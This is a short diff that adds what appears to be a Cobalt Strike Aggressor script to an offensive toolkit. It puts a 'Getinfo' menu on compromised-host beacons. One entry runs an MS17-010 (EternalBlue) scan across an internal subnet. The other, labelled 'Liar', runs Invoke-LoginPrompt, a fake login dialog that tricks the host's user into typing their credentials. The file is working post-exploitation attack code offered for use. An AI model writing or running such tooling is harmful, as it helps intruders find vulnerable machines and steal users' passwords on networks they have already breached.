@@ -1,0 +1,28 @@
+sub ms17_010_scan {
+	bpowershell_import!($bid, getFileProper(script_resource("modules/getinfo"), "Invoke-EternalScan.ps1"));
+    bpowerpick!($bid, 'EternalScan -target '.$3['ip']);
+}
+
+sub login_prompt {
+	bpowershell_import($1, getFileProper(script_resource("modules/getinfo"), "Invoke-LoginPrompt.ps1"));
+	bpowershell($1, 'Invoke-LoginPrompt');
+}
+
+popup beacon_bottom {
+	menu "&Getinfo" {
+		menu "&Scanner" {
+			item "Ms17-010 Scan" {
+			$bid = $1;
+			$dialog = dialog("Ms17-010 Scan", %(ip => "192.168.1.1-24", bid => $bid), &ms17_010_scan);
+			drow_text($dialog, "ip",  "IP:");
+			dbutton_action($dialog, "Go");
+			dialog_show($dialog);
+			}
+		}
+		menu "&Liar"{
+			item "Login prompt"{
+				login_prompt($1);
+			}
+		}
+	}
+}
